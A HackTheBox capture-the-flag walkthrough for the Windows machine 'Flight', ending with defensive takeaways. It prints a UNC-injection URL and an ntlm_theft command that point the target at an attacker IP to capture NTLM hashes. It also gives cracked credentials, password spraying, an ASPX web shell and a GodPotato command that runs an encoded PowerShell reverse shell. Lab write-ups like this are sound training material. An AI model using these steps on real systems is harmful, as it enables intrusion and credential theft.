# Flight — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Hard
**OS:** Windows

---

## TL;DR

DNS enumeration reveals a web subdomain vulnerable to LFI/UNC Path Injection → Responder captures the NTLM hash for `svc_apache` → Password spraying `svc_apache` credentials reveals the password for `s.moon` → NTLM Theft via poisoned files on a writeable SMB share captures hash for `c.bum` → WinRM access as `c.bum` allows uploading an ASPX web shell to the internal web root → Local port forwarding via Ligolo exposes the internal web app → Executing `GodPotato-NET4` through the web shell abused `SeImpersonatePrivilege` to get `SYSTEM`.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.11.187
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Apache httpd 2.4.52 (Win64) PHP/8.1.1 |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 389 | LDAP | Microsoft Windows AD LDAP (Domain: flight.htb) |
| 445 | SMB | microsoft-ds |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |
| 9389 | AD Web Services | .NET Message Framing |

We are dealing with a Windows Server Domain Controller for `flight.htb`. There is an Apache web server running on port 80.

Because port 53 (DNS) is open, we can use `gobuster dns` to look for hidden subdomains. 

```bash
gobuster dns -d flight.htb -w /usr/share/wordlists/dirb/common.txt 
```

The scan successfully identifies `school.flight.htb`. We add both `flight.htb` and `school.flight.htb` to our `/etc/hosts` file.

---

## Exploitation — LFI to NTLM Hash Capture

Navigating to `http://school.flight.htb` reveals a static page, but the URL utilizes a file inclusion parameter: `index.php?view=home.html`.

By modifying the parameter to read `index.php`, we can examine the source code of the application:

```text
http://school.flight.htb/index.php?view=index.php
```

The source code includes a rudimentary blacklist filter intended to prevent directory traversal:

```php
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
```

Crucially, the filter blocks backslashes (`\`), but it does not block forward slashes (`/`). Windows systems natively interpret forward slashes in UNC paths exactly the same as backslashes. 

This means we can force the web server to authenticate to an SMB server we control to fetch a remote file, thereby capturing its NTLMv2 hash.

We start `Responder` on our attacking machine:

```bash
sudo responder -I tun0 -A
```

Then we trigger the UNC path injection using forward slashes:

```text
http://school.flight.htb/index.php?view=//10.10.14.27/share/random
```

Responder instantly captures the hash for the service account running the Apache server: `svc_apache`.

```text
svc_apache::flight:6a4c2a45e9858fce:762E0FF...
```

We crack this offline using Hashcat and the RockYou wordlist.
`svc_apache : S@Ss!K@*t13`

Using crackmapexec with these new credentials, we enumerate a full list of domain users. Assuming they might reuse passwords or have a default password scheme, we password spray the `S@Ss!K@*t13` password across all domain users. 

This reveals that the user `s.moon` shares the exact same password!
`s.moon : S@Ss!K@*t13`

---

## Privilege Escalation — NTLM Theft & SeImpersonate

Logging into SMB using `s.moon`, we discover we have write access to a share named `Shared`.

When users browse SMB shares containing specific interactive files (like `.scf`, `.lnk`, or `.url`), Windows attempts to authenticate to the icon path specified within. We can generate "poisoned" files that point back to our Responder instance using the `ntlm_theft` tool.

```bash
python3 ntlm_theft.py -s 10.10.14.27 -f poisoned_files
```

We upload the generated payload files to the `Shared` SMB share. A short time later, a high-privileged user browses the directory, and Responder captures the hash for `c.bum`.

```text
c.bum::flight.htb:5ec8842164a88db...
```

We crack this new hash successfully: `c.bum : Tikkycoll_431012284`.

With the `c.bum` credentials, we gain write access to the `Web` share, which maps directly to the external web server root. We could upload a PHP reverse shell, but we can also use `RunasCs.exe` or Evil-WinRM to gain direct shell access as `c.bum` on port 5985.

Once on the machine via WinRM, we find we have write access to `C:\inetpub\development`. This is the webroot of an internal IIS server running on port 8000 (which is blocked externally by the Windows Firewall).

We place an ASPX web shell (`cmdasp.aspx`) into the `development` folder. To interact with it, we establish a local port forward using Ligolo-NG or Chisel to tunnel port 8000 out to our attacking machine.

Accessing our newly uploaded web shell at `http://127.0.0.1:8000/cmdasp.aspx` through the tunnel, we execute commands as the IIS service account (`iis apppool\defaultapppool`). 

Checking privileges (`whoami /priv`) confirms that we hold `SeImpersonatePrivilege`.

We upload `GodPotato-NET4.exe` to the machine and trigger it via the web shell to execute a PowerShell encoded reverse shell:

```cmd
.\GodPotato-NET4.exe -cmd "cmd /c powershell -e JABjAGwAaQBl..."
```

The payload executes as the highest privileged system account. 

We are `NT AUTHORITY\SYSTEM`. **Root.** 🎉

---

## Key Takeaways

- **UNC Path Injection:** Blacklisting characters like `\` is an ineffective defense against path injection on Windows, as the OS eagerly accepts `/` for UNC paths. The service account `svc_apache` was compromised because it attempted to access a remote share over SMB.
- **NTLM Theft via SMB:** Allowing broad write access to mutual shares ("Shared") enables attackers to plant malicious `.url`/`.scf` files that automatically coerce authentication from anyone opening the folder.
- **Service Account Privileges:** The `iis apppool` account was granted `SeImpersonatePrivilege` (by default on many IIS instances). This allows an attacker to elevate from a low-level web shell directly to `SYSTEM` using potato exploits (like GodPotato or PrintSpoofer).

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*